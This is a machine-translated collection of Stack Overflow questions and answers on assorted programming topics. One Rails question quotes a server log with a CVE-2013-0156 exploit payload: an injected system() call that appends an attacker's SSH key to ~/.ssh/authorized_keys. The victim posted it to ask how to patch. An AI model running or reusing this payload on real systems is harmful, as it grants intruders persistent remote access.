（与任何空格匹配`"\\s"`的[模式](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html)在哪里。请[在此处](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html)查看更多示例。）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-22T23:32:44.883

`""`您可以从 split中过滤掉`Array`。

```
scala> val sentence = "1 2  3   4".split(" ").filterNot(_ == "")
sentence: Array[java.lang.String] = Array(1, 2, 3, 4) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-12-05T07:49:16.643

这个正则表达式`\\W+`传递（字母非数字）单词，因此

```
val sentence = "1 2  3   4".split("\\W+")
sentence: Array[String] = Array(1, 2, 3, 4) 
```

为了便于使用，在 Scala 2.10.* 和 2.11.* 中考虑

```
implicit class RichString(val s: String) extends AnyVal {
  def words = s.split("\\W+")
} 
```

因此，

```
sentence.words
res: Array[String] = Array(1, 2, 3, 4) 
```

# java - 字典集合中的链表

> ID：14469961
> 
> 赞同：0
> 
> 时间：2013-01-22T23:30:51.900
> 
> 标签：java, linked-list

我是整个“数据结构”的新手。

我正在尝试使用 LinkedList（来自 Java 集合）来实现字典。我截断了过去某人的一个例子。

[入口.java]

```
public class Entry<K, V> {

    K key;
    V value;

    public Entry(K key, V value) {
        this.key = key;
        this.value = value;
    }

    public K key() {
        return key;
    }

    public V value() {
        return value;
    }
} 
```

[字典.java]

```
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;

public class Dictionary<K, V> {

    private List<Entry<K, V>> set;

    public Dictionary() {
        this.set = new LinkedList<Entry<K, V>>();
    }

    public Entry<K, V> find(K key) {
        // for all entries in set...
        //   check if key mathches
        //     - if it does than return it

        // else
        return null;
    }

    /**
     * insert(k, o): inserts and returns the entry (k, o)
     */
    public Entry<K, V> insert(K key, V value) {
        // obvious
        return null;
    }

    public int size() {
        return set.size();
    }

    public boolean isEmpty() {
        return size() == 0;
    }
} 
```

你能告诉我一个如何使用 Java Collection of LinkedList 中的“插入”和“查找”函数的例子吗？我需要一个单独的索引吗？除了 K 和 V。

非常感谢您提前。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:45:08.663

地图界面就是您要寻找的。根据Javadocs：

> Dictionary 类是任何类的抽象父类，例如 Hashtable，它将键映射到值。每个键和每个值都是一个对象。在任何一个 Dictionary 对象中，每个键最多与一个值相关联。给定一个字典和一个键，可以查找相关的元素。任何非空对象都可以用作键和值。通常，此类的实现应使用 equals 方法来确定两个键是否相同。
> 
> ***注意：此类已过时。新的实现应该实现 Map 接口，而不是扩展这个类。***

正如 Javadocs 所述，哈希映射包含键值对，以下是实现此类的方式：

```
 package hashmap;
import java.util.*;

public class HashMap<K,V> implements Map<K,V> {
    private final int TABLESIZE = 101;
    private LinkedList<Node<K, V>>[] list;

    @SuppressWarnings("unchecked")
    public HashMap() {
        // Creates a hash table with a table size of TABLESIZE  
        list = new LinkedList[TABLESIZE];
    }

    // Returns the Hasindex of a key
    private int getHashIndex(Object key) {
        String hashCode = key.toString();
        int i = Integer.parseInt(hashCode.substring(hashCode.length() - 4));
        return i % TABLESIZE;
    } 
```

// get 方法首先找到桶然后迭代每个桶 public V get(Object key) { try {

```
 LinkedList<Node<K,V>> bucket = list[getHashIndex(key)]; 
            Iterator<Node<K,V>> itr = bucket.iterator();
            while (itr.hasNext()) {
                Node<K,V> node = itr.next();
                if (node.getKey().equals(key)) {
                    return node.getValue();
                }
            }
        }
        // if there is no bucket return null

        catch (NullPointerException e) {
            return null;
        }

        return null;
    }

       //add method
    public V put(K key, V value) {  
        // Hvis der ikke er en spand i forvejen tilføjes en ny
        if (list[getHashIndex(key)] == null) {
            list[getHashIndex(key)] = new LinkedList<Node<K,V>>();
        }

        LinkedList<Node<K,V>> bucket = list[getHashIndex(key)]; 
        Iterator<Node<K,V>> itr = bucket.iterator();
        V prevouis = null;
        while (itr.hasNext()) {
            Node<K,V> node = itr.next();
            if (node.getKey().equals(key)) {
                prevouis = node.getValue();
                bucket.remove(node);
                break;
            }
        }
        bucket.addLast(new Node<K,V>(key, value));

        return prevouis;
    }

    // remove method
    public V remove(Object key) {
        // Itererer igennem spanden for at finde og slette den korrekte nøgle       
        LinkedList<Node<K,V>> bucket = list[getHashIndex(key)]; 
        Iterator<Node<K,V>> itr = bucket.iterator();
        V value = null;
        while (itr.hasNext()) {
            Node<K,V> node = itr.next();
            if (node.getKey().equals(key)) {
                value = node.getValue();
                bucket.remove(node);
                break;
            }
        }

        if (bucket.isEmpty()) {
            list[getHashIndex(key)] = null;
        }

        return value;
    }

    @Override
    public void clear() {
        // TODO Auto-generated method stub

    }

    @Override
    public boolean containsKey(Object key) {
        // TODO Auto-generated method stub
        return false;
    }

    @Override
    public boolean containsValue(Object value) {
        // TODO Auto-generated method stub
        return false;
    }

    @Override
    public Set<java.util.Map.Entry<K, V>> entrySet() {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public boolean isEmpty() {
        // TODO Auto-generated method stub
        return false;
    }

    @Override
    public Set<K> keySet() {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void putAll(Map<? extends K, ? extends V> m) {
        // TODO Auto-generated method stub

    }

    @Override
    public int size() {
        // TODO Auto-generated method stub
        return 0;
    }

    @Override
    public Collection<V> values() {
        // TODO Auto-generated method stub
        return null;
    }

    public void printHashTable() {
        System.out.println("HashTable:");
        int nodeCount = 0;
        for (int i = 0; i < list.length; i++) {
            LinkedList<Node<K,V>> bucket = list[i];
            if (bucket != null) {
                nodeCount += bucket.size();
                System.out.println("Index " + i + ": " + bucket);
            }
        }
        System.out.println("Total nodes: " + nodeCount + "\n");
    }
} 
```

此示例还显示了如何使用 Buckets（在本例中为 LinkedList）来避免碰撞 调用此方法`seperate chaining`

# sql-server-2005 - 逆向工程师代码优先没有抓取数据库中的所有视图，聚合导致问题？

> ID：14469962
> 
> 赞同：1
> 
> 时间：2013-01-22T23:30:55.037
> 
> 标签：sql-server-2005, entity-framework-4, ef-code-first

我最近向数据库添加了 7 个视图。当我去可能包含该数据库的数据模型的项目并使用逆向工程师代码优先（在 EF 4.3.1 中）时，不会生成几个视图。

起初，我认为存在某种顺序问题，其中一些依赖于其他视图的视图以某种方式出现故障，可能会影响流程。我重命名了我的视图，以便在 SQL Server Management Studio 中它们按字母顺序出现，以便它们需要。

这似乎没有帮助。

生成的 5 个视图确实是需要存在的前 5 个视图。但是，最后的 2 个视图是未生成的视图。

除前 3 个视图外，所有视图都包含其他视图的连接，因此我认为连接不会成为问题。

但是，看起来好像两个缺失的视图都包含聚合（SUM 和适当的 GROUP BY 函数），而前 5 个没有。

我已经进行了一些搜索，但我没有看到任何地方对逆向工程师代码优先的聚合函数有限制。这个问题有解决方法吗？

**更新**：

我做了一个新项目，没有使用我自己复杂的现有数据库，而是尝试使用 Adventureworks。当我对其进行逆向工程时，EF 确实对带有聚合的视图进行了正确建模。

当我查看此视图​​ (Sales.vSalesPersonSalesByFiscalYears) 时，我注意到所有聚合都是使用数据透视完成的。因此，我随后重写了使用聚合来使用枢轴的视图。他们仍然没有被进口。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:57:15.267

逆向工程代码中有一些奇怪的关键检测逻辑，我并不完全理解。可能只是无法为这些视图检测到实体键。

[在一个单独的项目中，尝试使用database-first](http://msdn.microsoft.com/en-us/data/jj206878)进行逆向工程。逆向工程的逻辑是相同的，它可能会让您更深入地了解为什么无法映射视图。

如果一切都失败了，您始终可以手动创建映射到这些视图的 Code First 类。[msdn.com/data/ef](http://msdn.com/data/ef)站点有一些关于 Code First 的[默认约定](http://msdn.microsoft.com/en-us/jj679962)的好文章，以及可用于将 POCO 类映射到数据库的[数据注释](http://msdn.microsoft.com/en-us/jj591583)和流式 API（用于[属性和类型](http://msdn.microsoft.com/en-us/jj591617)或[关系）。](http://msdn.microsoft.com/en-us/jj591620)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-07T00:30:50.980

原因是在视图中，表中没有 Identity 列。如果您将表中的关键列添加到视图中，则逆向工程将识别它。这对我行得通。

# windows - 需要批处理文件的帮助：检测现有驱动器上的文件夹

> ID：14469964
> 
> 赞同：1
> 
> 时间：2013-01-22T23:31:11.100
> 
> 标签：windows, batch-file, drive

我一直在处理一个批处理文件来搜索一个文件夹，如果它存在，则使用该变量执行 goto 命令。它可以工作，但是每次您收到垃圾邮件时：“驱动器中没有磁盘。请将磁盘插入驱动器到 \device\hardisk1\dr21 等等。有没有办法可以防止此消息弹出？

批处理文件：

```
@echo off
setLocal Enabledelayedexpansion

for %%d in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (
if exist %%d:\custom\ (
  ECHO Device Found : %%d
  )
) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:09:18.077

如果您从命令行调用它，那么：

```
batch.bat arguments 2> NUL 
```

会将所有错误消息重定向到`NUL`设备，这将防止它们弹出。

或在批处理文件本身中创建一个包装子例程，例如：

```
@echo off
setLocal Enabledelayedexpansion

CALL :SUB_A 2> NUL
GOTO :EOF

:SUB_A
for %%d in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (
    if exist %%d:\custom\ (
      ECHO Device Found : %%d
    )
)
GOTO:EOF 
```

不会返回错误，因为子程序错误消息将`NUL`

# c# - 确保后台工作人员在运行之前已完成（再次）

> ID：14469965
> 
> 赞同：0
> 
> 时间：2013-01-22T23:31:20.527
> 
> 标签：c#, slider, while-loop, backgroundworker, mediaelement

上下文：我正在通过媒体元素播放音乐，并使用滑块显示歌曲所在的位置。出于显而易见的原因，该更新是在后台工作人员中完成的。

```
private void bgPlay_DoWork(object sender,DoWorkEventArgs e)
    {

        while (isMediaPlaying)
        {
            this.Dispatcher.Invoke((Action)(() =>
            {
                timelineSlider.Value = mediaElement1.Position.TotalMilliseconds;
            }));

        }
    }

    private void Library_MouseDoubleClick(object sender, MouseButtonEventArgs e)
    {
        try
        {
            mediaElement1.Stop();
            isMediaPlaying = false;
            mediaElement1.Source = new Uri(songData[Library.SelectedIndex].Location);
            mediaElement1.Volume = (double)volumeSlider.Value;

            mediaElement1.Play();

            isMediaPlaying = true;

            bgPlay.RunWorkerAsync();
        }
        catch(Exception ex) {
            F.MessageBox.Show(ex.ToString());
        }
    } 
```

当我播放一首歌曲，然后双击另一首歌曲时，后台工作人员仍在循环并引发异常，因为它`bgPlay.RunWorkerAsync();`在前一个实例完成之前到达。我尝试使用 isMediaPlaying 布尔值来告诉后台工作人员何时退出循环，但主线程`bgPlay.RunWorkerAsync();`在完成之前到达。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:38:37.173

当一个人几乎没有开始使用线程编程时，你正在遭受一个常见的错误，这是一种[竞争条件](http://support.microsoft.com/kb/317723)

我建议像这样重写代码：

```
private static String threadingLock = "";

private void bgPlay_DoWork(object sender,DoWorkEventArgs e)
    {

        while (true)
        {
            lock(threadingLock) {
                if(!isMediaPlaying)
                    break;
            }
            this.Dispatcher.Invoke((Action)(() =>
            {
                timelineSlider.Value = mediaElement1.Position.TotalMilliseconds;
            }));

        }
    }

    private void Library_MouseDoubleClick(object sender, MouseButtonEventArgs e)
    {
        try
        {
            lock(threadingLock) {
                isMediaPlaying = false;
            }
            mediaElement1.Stop();

            mediaElement1.Source = new Uri(songData[Library.SelectedIndex].Location);
            mediaElement1.Volume = (double)volumeSlider.Value;

            mediaElement1.Play();

            isMediaPlaying = true;

            bgPlay.RunWorkerAsync();
        }
        catch(Exception ex) {
            F.MessageBox.Show(ex.ToString());
        }
    } 
```

作为一个友好的提示，`Thread.sleep(200)`在调用滑块上的更新之前添加一个。它将减少 CPU 使用率，而不会影响应用程序的功能。

# objective-c - 静态指针是强指针吗？

> ID：14469966
> 
> 赞同：9
> 
> 时间：2013-01-22T23:31:30.057
> 
> 标签：objective-c

在objective-c中，我知道静态变量（应该？）在程序的生命周期内保留其值。但如果它存储一个指针，它在 ARC中算不算**强？**我是否可以依赖它并确保一旦我将它分配给静态变量，该实例将**永远不会离开堆？**

```
static ClassA* shared;

-(id)init
{
   if (self=[super init]) {
       shared=self;
   }
   return self;
} 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-01-22T23:39:00.777

是的，一旦分配，您就可以依赖它。

[过渡到 ARC 发行说明](https://developer.apple.com/library/mac/#releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html)状态：

> 在 ARC 下，strong 是对象类型的默认值。

接着：

> __strong 是默认值。只要有一个指向它的强指针，一个对象就保持“活动”。

鉴于您的`static`指针引用了该对象，它将保持“活动”。指针的范围（无论是全局的、堆栈上的指针还是实例变量）都没有区别。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T00:10:48.950

看起来你应该只是实现一个[Singleton](http://en.wikipedia.org/wiki/Singleton_pattern)，然后你可以通过将实例设置为 nil 来摆脱它。

# java - 我们可以从evernote文件中提取文本内容吗

> ID：14469971
> 
> 赞同：1
> 
> 时间：2013-01-22T23:31:48.047
> 
> 标签：java, evernote

我正在开发一个需要从 Evernote 文件中提取文本内容的项目。是否有任何 Java 库可以帮助做到这一点？Evernote API 似乎不支持这一点。

请让我知道你的意见。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T23:14:12.657

有一个[Java SDK](https://github.com/evernote/evernote-sdk-java)，API 参考在[这里](http://dev.evernote.com/documentation/reference/)。

例如，如果要获取笔记的内容，可以使用[`NoteStore.getNote`](http://dev.evernote.com/documentation/reference/NoteStore.html#Fn_NoteStore_getNote)with `withContent`true 来获取`Note`对象。或者，如果您正在谈论附件文件，则将其与`withResourcesData`true 一起使用可能会有所帮助。[`NoteStore.getResoruce`](http://dev.evernote.com/documentation/reference/NoteStore.html#Fn_NoteStore_getResource)如果您已经知道，您也可以使用`guid`. 有关 Evernote 资源的更多详细信息，请参见[此处](http://dev.evernote.com/documentation/cloud/chapters/Resources.php)。

[你可以从这里](http://dev.evernote.com/documentation/cloud/)开始使用/学习 Evernote API 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:44:21.543

有一个Java SDK：

`https://github.com/evernote`

我是直接从 Evernote Cloud API 页面得到的。

# youtube - youtube 分析 ID 值

> ID：14469975
> 
> 赞同：0
> 
> 时间：2013-01-22T23:32:03.917
> 
> 标签：youtube

我正在尝试使用 Youtube 分析，但我不确定如何正确填写参数

这是我要填写的表格：[https ://developers.google.com/apis-explorer/#s/youtubeAnalytics/v1/youtubeAnalytics.reports.query](https://developers.google.com/apis-explorer/#s/youtubeAnalytics/v1/youtubeAnalytics.reports.query)

你如何找出id的值？

它声明：用于检索 YouTube 分析数据的唯一频道或内容所有者 ID。channel==C 或 contentOwner==O 其中“C”是加密的频道 ID，“O”是内容所有者名称。（细绳）

我试过 contentOwner=={myapikey} 其中 {myapikey} 是我的谷歌应用程序的 api 密钥

如何获得正确的 id 值？我的目标是对上述链接执行查询。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T10:21:47.060

[您可以使用对https://developers.google.com/youtube/v3/docs/channels/list](https://developers.google.com/youtube/v3/docs/channels/list)的经过身份验证的调用获取当前登录用户的值，您可以将这些值放入 ids=channel==%here$%

对于 ids=contentOwner==%here%：适用于您的用户与 YT 内容所有者相关联的情况。现在，您需要让您的客户（YT 内容所有者）获取此 ID。客户可以从他们的合作伙伴经理那里得到它。

# graphics - 查找椭圆内的像素

> ID：14469981
> 
> 赞同：0
> 
> 时间：2013-01-22T23:32:42.037
> 
> 标签：graphics, pixels, ellipse

我的数学技能很糟糕，所以我什至不知道从哪里开始。这是一个用 C# 编写的爱好项目。

为了简单起见，假设我需要对椭圆内的所有像素进行操作。如何获得需要使用的椭圆内的有效像素位置数组？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:47:20.687

在椭圆中，椭圆中的一点与两个焦点之间的距离之和是长轴的两倍，因此：

```
PF1 + PF2 = 2a 
```

其中*P*是点，*F1*和*F2*是焦点，*a*是半长轴。

如果总和小于 2a，则该点将位于椭圆内。

[维基百科](http://en.m.wikipedia.org/wiki/Ellipse)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:56:14.797

对于该任务，我建议您查看[bresenhams 填充圆 Algorit](http://actionsnippet.com/?p=496) hm。如果您缩放 y achsis，您也可以使用它来绘制椭圆。Bresenham 算法仅使用整数运算来工作，这使得它们快速（est）

这仅适用于轴平行椭圆

# zend-framework - DomPDF 在 Zend Framework 1.12.0 中不起作用 需要输入文件（即 input_file _GET 变量）

> ID：14469982
> 
> 赞同：2
> 
> 时间：2013-01-22T23:32:43.270
> 
> 标签：zend-framework, frameworks, dompdf

DomPDF 使用 Zend Framework 1.12.0 引发以下错误。

```
Error
An input file is required (i.e. input_file _GET variable). 
```

但是，使用 Zend 1.7.0 可以正常工作。

这是我将它包含在控制器中的方式

```
require_once("dompdf_config.inc.php");
spl_autoload_register('DOMPDF_autoload'); 
```

这就是我在 Bootstrap 文件中实例化 Zend Loader Autoloader 的方式

```
$loader = Zend_Loader_Autoloader::getInstance();
$loader->setFallbackAutoloader(true); 
```

我相信这可能是由于自动加载 DOMPDF。有什么建议么？

# c - 是否有一个 C 库可以在噪声数据中找到峰值，相当于 findPeaks.m

> ID：14469983
> 
> 赞同：1
> 
> 时间：2013-01-22T23:32:43.877
> 
> 标签：c, signal-processing, smoothing

我有一组嘈杂的数据，想找到其中的峰值。这个确切的任务有一个 matlab 函数，其中包括数据的平滑。我叫[findpeaks.m](http://terpconnect.umd.edu/~toh/spectrum/findpeaks.m)

现在当我在 C 中工作时，我要么必须自己编写代码，要么使用一些我不知道的函数。我希望你能告诉我它们是否存在以及我在哪里可以找到它们，因为这是一个非常常见的问题。

要清楚我在搜索什么：首先平滑我的数据然后计算峰值的函数，两者都最好使用平滑方法、峰宽等的一些参数。

谢谢！

# ruby-on-rails - 发现 ActionDispatch::Routing 漏洞，是否已修补？

> ID：14469986
> 
> 赞同：3
> 
> 时间：2013-01-22T23:33:00.627
> 
> 标签：ruby-on-rails

几天前我注意到我的网站上有一些不寻常的活动，所以我决定查看生产日志。这是我发现的：

```
Started GET "/" for 74.219.112.36 at 2013-01-11 20:25:05 +0000
Processing by HomeController#logo as */*
Parameters: {"exploit"=>#
<ActionDispatch::Routing::RouteSet::NamedRouteCollection:0xcb7e650 
@routes={:"foo; system('cd ~;mkdir .ssh;echo ssh-rsa 
AAAAB3NzaC1yc2EAAAABJQAAAIEAtHtSi4viCaMf/KeG3mxlynWEWRPV
/l4+De+BBFg/xI2ybuFenYYn4clbLFugxxr1sDNr0jBgk0iMqrLbVcdc9p
DjKuymKEVbsJbOqrnNMXlUtxCefeGT1piY8Z/7tapLsr+GCXokhIcB2FPzq
TtOKhnJvzgA4eZSVZsVlxTwyFM= root >> ~/.ssh/authorized_keys')\n__END__\n"=>
#<OpenStruct defaults={:action=>"create", :controller=>"foos"}, 
required_parts=[], requirements={:action=>"create", :controller=>"foos"},
segment_keys=[:format]>}, @helpers=[:"hash_for_foo; system('cd ~;
mkdir .ssh;echo ssh-rsa 
AAAAB3NzaC1yc2EAAAABJQAAAIEAtHtSi4viCaMf/KeG3mxlynWEWRPV
/l4+De+BBFg/xI2ybuFenYYn4clbLFugxxr1sDNr0jBgk0iMqrLbVcdc9pDjKuymKEVbs
JbOqrnNMXlUtxCefeGT1piY8Z/7tapLsr+GCXokhIcB2FPzqTtOKhnJvzgA4eZSVZsVlx
TwyFM= root >> ~/.ssh/authorized_keys')\n__END__\n_url", :"foo; 
system('cd ~;mkdir .ssh;echo ssh-rsa 
AAAAB3NzaC1yc2EAAAABJQAAAIEAtHtSi4viCaMf/KeG3mxlynWEWRPV/l4+De+BBFg
/xI2ybuFenYYn4clbLFugxxr1sDNr0jBgk0iMqrLbVcdc9pDjKuymKEVbsJbOqrnNMXlUtxCefeG
T1piY8Z/7tapLsr+GCXokhIcB2FPzqTtOKhnJvzgA4eZSVZsVlxTwyFM= 
root >> ~/.ssh/authorized_keys')\n__END__\n_url", :"hash_for_foo; 
system('cd ~;mkdir .ssh;echo ssh-rsa
AAAAB3NzaC1yc2EAAAABJQAAAIEAtHtSi4viCaMf/KeG3mxlynWEWRPV/l4+De+BBFg
/xI2ybuFenYYn4clbLFugxxr1sDNr0jBgk0iMqrLbVcdc9pDjKuymKEVbsJbOqrnNMXlUt
xCefeGT1piY8Z/7tapLsr+GCXokhIcB2FPzqTtOKhnJvzgA4eZSVZsVlxTwyFM= root >>
~/.ssh/authorized_keys')\n__END__\n_path", :"foo; system('cd ~;mkdir .ssh;
echo ssh-rsa 
AAAAB3NzaC1yc2EAAAABJQAAAIEAtHtSi4viCaMf/KeG3mxlynWEWRPV/l4+De+BBFg
/xI2ybuFenYYn4clbLFugxxr1sDNr0jBgk0iMqrLbVcdc9pDjKuymKEVbsJbOqrnNMXlUtxCefeG
T1piY8Z/7tapLsr+GCXokhIcB2FPzqTtOKhnJvzgA4eZSVZsVlxTwyFM= root >> 
~/.ssh/authorized_keys')\n__END__\n_path"], @module=#<Module:0xcb7e5c4>>}
Rendered landing_users/_form.html.haml (4.7ms)
Rendered home/logo.html.haml within layouts/application (7.8ms)
Completed 200 OK in 11ms (Views: 10.4ms | ActiveRecord: 0.0ms) 
```

我继续检查他们的系统调用是否有效，并且确实在 ~/.ssh/authorized_keys 中找到了相同的 ssh 密钥。所以这意味着他们能够通过我的 Rails 应用程序运行系统调用！！！！谢天谢地，我的 rails 应用程序没有在 root 下运行，所以他们没有获得 root 访问权限。但无论如何，这让我感到害怕。

有没有人遇到过这个漏洞？如果是这样，您是如何修补的？

我的 rails 应用程序在 Ubuntu 12.04 上，使用 rails 版本 3.2.8 和 ruby​​ 版本 1.9.3p125。如果任何其他信息会有所帮助，请告诉我！

我发现一篇[博客文章](http://ronin-ruby.github.com/blog/2013/01/09/rails-pocs.html)提到了这个漏洞，但没有解决方案，只是如何执行它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-23T00:00:35.177

您是否按照该博客中的链接进行操作？

> 1 月 8 日，Aaron Patterson 宣布[CVE-2013-0156](https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/61bkgvnSGTQ)

如果你这样做了，你会看到它在 Rails 3.2.11 中得到了修复。

**立即**更新您的应用程序！

# android - android opengl用相机变焦检查点的可见性

> ID：14469993
> 
> 赞同：0
> 
> 时间：2013-01-22T23:33:38.103
> 
> 标签：android, opengl-es, camera, 2d, visibility

我正在使用 android opengl 1.1 2d 游戏，该游戏具有车辆的顶视图和相对于车辆速度的相机变焦。当速度增加时，相机会缩小，为玩家提供最佳的道路能见度。

我很难找到准确的方法来检测一个精灵是否可见或者不考虑他的位置和当前的相机变焦。

重要的精度，我所有的游戏对象都在同一个 z 坐标上。我使用 3d 只是为了拍摄效果。（这就是我不需要平截头体复杂计算的原因）

这是我的 GLSurfaceView.Renderer 类的示例

```
public static float fov_degrees =  45f;
public static float fov_radians =  fov_degrees / 180 * (float) Math.PI;
public static float aspect; //1.15572 on my device
public static float camZ;  //927 on my device

@Override
public void onSurfaceChanged(GL10 gl, int x, int y) {

    aspect =  (float) x / (float) y;
    camZ = y / 2 / (float) Math.tan(fov_radians / 2);

    Camera.MINIDECAL = y / 4;   // minimum cam zoom out (192 on my device)

    if (x == 0) { // Prevent A Divide By Zero By
        x = 1; // Making Height Equal One
    }
    gl.glViewport(0, 0, x, y); // Reset The Current Viewport
    gl.glMatrixMode(GL10.GL_PROJECTION); // Select The Projection Matrix
    gl.glLoadIdentity(); // Reset The Projection Matrix

    // Calculate The Aspect Ratio Of The Window
    GLU.gluPerspective(gl, fov_degrees, aspect , camZ / 10, camZ * 10);

    GLU.gluLookAt(gl, 0, 0, camZ, 0, 0, 0, 0, 1, 0); // move camera back

    gl.glMatrixMode(GL10.GL_MODELVIEW); // Select The Modelview Matrix

    gl.glLoadIdentity(); // Reset The Modelview Matrix 
```

当我绘制任何相机相关对象时，我使用这种翻译方法：

```
gl.glTranslatef(position.x - camera.centerPosition.x , position.y -camera.centerPosition.y , - camera.zDecal); 
```

一切都显示得很好，当他检查对象是否可见时，问题来自我的物理线程：

```
public static boolean isElementVisible(Element element) {

    xDelta =  (float) ((camera.zDecal + GameRenderer.camZ) * GameRenderer.aspect *  Math.atan(GameRenderer.fov_radians));
    yDelta = (float) ((camera.zDecal + GameRenderer.camZ)*   Math.atan(GameRenderer.fov_radians));

    //(xDelta and yDelta are in reallity updated only ones a frame or when camera zoom change)

    Camera camera = ObjectRegistry.INSTANCE.camera;

    float xMin = camera.centerPosition.x - xDelta/2;
    float xMax = camera.centerPosition.x + xDelta/2;

    float yMin = camera.centerPosition.y - yDelta/2;
    float yMax = camera.centerPosition.y + yDelta/2;

    //xMin and yMin are supposed to be the lower bounds x and y of the visible plan
    // same for yMax and xMax

    // then i just check that my sprite is visible on this rectangle.

    Vector2 phD = element.getDimToTestIfVisibleOnScreen();
    int sizeXd2 = (int) phD.x / 2;
    int sizeYd2 = (int) phD.y / 2;

    return (element.position.x + sizeXd2 > xMin)
            && (element.position.x - sizeXd2 < xMax)
            && (element.position.y - sizeYd2 < yMax)
            && (element.position.y + sizeYd2 > yMin);

} 
```

不幸的是，这个物体消失得太快并且出现得太晚了，所以我手动在相机上添加了一些缩小以进行测试。

我做了一些手动测试，发现在计算 xDelta 和 yDelta 时，在相机 z 索引上添加大约 260，效果很好。所以现在是：

```
xDelta =  (float) ((camera.zDecal + GameRenderer.camZ + 260) * GameRenderer.aspect *  Math.atan(GameRenderer.fov_radians));
yDelta = (float) ((camera.zDecal + GameRenderer.camZ + 260)*   Math.atan(GameRenderer.fov_radians)); 
```

因为它是一个 hack，并且幻数可能无法在我想了解我错过的所有设备上运行。我猜这个“260”幻数中有一些东西来自 fov 或比率宽度/高度，可以设置为像素完美检测的公式参数。

有什么猜测吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:54:00.233

我的猜测是你应该使用`Math.tan(GameRenderer.fov_radians)`而不是`Math.atan(GameRenderer.fov_radians)`.

推理：

如果您使用的是 90 度 fov 的相机，那么`xDelta`并且`yDelta`应该是无限大的，对吧？因为相机必须查看整个无限平面。

tan(pi/2) 是无限的（负无限）。atan(pi/2) 只是 1.00388...

tan(pi/4) 为 1，而 atan(pi/4) 为 0.66577...

# c# - iText 文档

> ID：14469999
> 
> 赞同：0
> 
> 时间：2013-01-22T23:34:01.067
> 
> 标签：c#, itext

我有一个包含许多填写字段（文本和复选框）的 PDF 文档。你如何去引用这些对象，以便我可以操纵它的值，然后将更新后的 PDF 推送给用户，他们可以将其保存到他们想要的位置。我没有找到任何关于如何做到这一点的好文档。

您能给我的任何信息将不胜感激。

现在我正在使用以下代码，但是当我打开它时，我的 PDF 阅读器告诉我它已损坏或损坏。

```
 String srcPath = Server.MapPath("~/App_Data/w9.pdf");
        String dstPath = Server.MapPath("~/App_Data/w9_" + Session.SessionID + "_updated.pdf");

        if (File.Exists(dstPath)) {
            File.Delete(dstPath);
        }

        File.Copy(srcPath, dstPath);

        PdfReader reader = new PdfReader(dstPath);

        try
        {
            PdfStamper stamper = new PdfStamper(reader, Response.OutputStream);
            stamper.FormFlattening = true;
            stamper.AcroFields.SetField("topmostSubform[0].Page1[0].f1_01_0_[0]", "Homer J Simpson");

            Response.ContentType = "application/pdf";
            Response.BufferOutput = true;
            Response.AppendHeader("Content-Disposition", "attachment; filename=W9_" +Session.SessionID + "_Complete.pdf");

            Response.TransmitFile(dstPath);
        }
        catch (Exception ex)
        {
            Response.Write(ex.Message);
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T09:45:18.100

我是 iText 文档的作者。如果你有静态表格，那么你可以使用本章介绍的方法来填写你的表格： http: [//www.manning.com/lowagie2/samplechapter6.pdf](http://www.manning.com/lowagie2/samplechapter6.pdf)

阅读第 6.3.5 节，了解如何填写使用 Open Office 创建的表单。但是，看起来好像您使用的是使用 Adob​​e LiveCycle 创建的表单（字段名`topmostSubform[0].Page1[0].f1_01_0_[0]`是 XFA 表单的典型名称）。

第 6.3.5 节以以下评论结束：

> “关于表单还有很多要说的，但在我们讨论注释之前，我们无法进一步详细说明。此外，我还没有谈到不同类型的 PDF 表单：有基于 AcroForm 技术的表单（就像您使用 Open Office 创建的表单），还有 XFA 表单（使用 Adob​​e Designer 创建）。这将不得不等到第 8 章，因为我们还有一组 PDF 操作类要介绍。”

如果您的表单是动态 XFA 表单，内部没有任何 AcroForm 技术，则需要 XFA Worker 将其展平。您可以在此处下载 XFA Worker 的试用版：http: [//itextsupport.com/download/xfaworker.html](http://itextsupport.com/download/xfaworker.html)

在继续之前，您必须回答的第一个问题是：我有 AcroForm 还是 XFA 表格？如果您有 XFA 表单，则需要 Adob​​e LiveCycle ES 或 XFA Worker 来填写和展平此类表单。两者都是闭源产品。我不知道任何支持 XFA 扁平化的免费/开源库。

PS：如果“损坏”意味着您收到一条消息说[此文档启用了扩展功能......](http://www.flickr.com/photos/itextinaction/4329590603/in/set-72157624120062830/lightbox/)那么您正在破坏阅读器启用。您应该阅读“iText in Action - Second Edition”的第 8 章，了解如何避免出现此消息。